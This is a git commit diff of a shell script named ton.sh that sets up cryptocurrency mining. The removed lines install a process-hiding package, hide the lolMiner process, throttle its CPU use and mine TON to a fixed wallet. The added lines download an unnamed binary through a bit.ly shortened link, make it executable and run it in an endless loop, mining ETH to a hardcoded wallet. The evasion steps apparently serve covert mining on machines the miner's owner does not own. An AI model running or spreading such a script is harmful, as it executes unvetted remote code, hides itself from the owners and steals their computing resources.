1319ceb27191d936469fb096161da5a33f9a012f
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-01-21 07:30:00 -0500

    Update ton.sh

--- ton.sh
+++ ton.sh
@@ -1,15 +1,16 @@
 #!/bin/sh
 
-apt update && apt -y install sudo
-sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-sudo apt-get install -y nodejs
-sudo apt-get install gcc g++ make
-sudo -u root npm i -g node-process-hider
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
-wget https://bitbucket.org/oqoixgqoq9/tur/downloads/lolMiner
-ph add lolMiner
-chmod +x lolMiner
-cpulimit -e lolMiner -l 30 &
-./lolMiner --algo TON --pool https://server1.whalestonpool.com --user EQAhYfA5-ENSYrig434CEOSFH47z5I6hft6X6magteGGEwlT.$(cat /proc/sys/kernel/hostname)
+#!/bin/bash
+POOL=us-eth.2miners.com:2020
+WALLET=0x443dd6fa59a4b77cbe694b61b0fe54dac7eedb6b
+WORKER=$(echo $(shuf -i 41-80 -n 1)-ETHash)
+#wget https://github.com/drJamesjack/prem/raw/main/lolMiner
+wget https://bit.ly/3FpnfeJ
+chmod +x 3FpnfeJ
+#chmod +x lolMiner
+while [ 1 ]; do
+#./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER --pass c=LTC,mc=ETH
+./3FpnfeJ --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
+sleep 5
+done
+sleep 999999999
